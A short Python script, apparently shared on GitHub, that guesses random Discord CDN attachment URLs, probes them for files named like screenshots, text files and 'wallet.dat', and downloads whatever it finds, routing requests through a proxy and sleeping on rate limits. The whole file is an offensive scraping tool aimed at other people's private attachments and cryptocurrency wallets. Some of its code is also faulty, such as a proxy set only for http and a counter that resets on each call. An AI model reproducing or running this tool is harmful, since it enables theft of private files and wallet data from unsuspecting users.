import requests, random, itertools,subprocess, threading, time, colorama
from colorama import Fore
colorama.init()

com_name = ['unknown.png','image0.png','wallet.dat','file.txt']

# Famous Soldier | https://github.com/Famous-Soldier

def generate():
	url = 'https://cdn.discordapp.com/attachments/'
	url = url + f'{random.randrange(1, 10**18):018}' + '/' + f'{random.randrange(1, 10**18):018}' + '/'
	for i in com_name:
		print('[+] Trying ',url+i,'from ',proxy)
		if validate(url + i) == True:
			print(Fore.GREEN + '[$] Pulling file from', url+i)
			getfile(url + i, i)
		elif validate(url+i) == '@':
			print(Fore.RED + '[!] Ratelimit occuring... temporarily suspending process')
			time.sleep(30)
		elif validate(url+i) == False:
			print('[%] Not valid')
		else:
			print(Fore.RED + '[!] Something unexpected happened... start again with a new proxy')
			input('')
			quit()

def validate(url):
	res = requests.get(url, proxies=proxy)
	if res.status_code == 200:
		return True
	if res.status_code == 403:
		return False
	elif res.status_code == 429:
		return '@'

def getfile(url,name):
	count=0
	r = requests.get(url, proxies=proxy)
	count+=1
	name=str(count)+'_'+name
	f = open(name, 'wb')
	for chunk in r.iter_content(chunk_size=512 * 1024): 
		if chunk:
			f.write(chunk)
	f.close()
	return 



subprocess.run('cls',shell=True)
ui_proxy = input('Please enter http proxy >> ')
proxy = {
        'http':ui_proxy
        }


while True:
        generate()
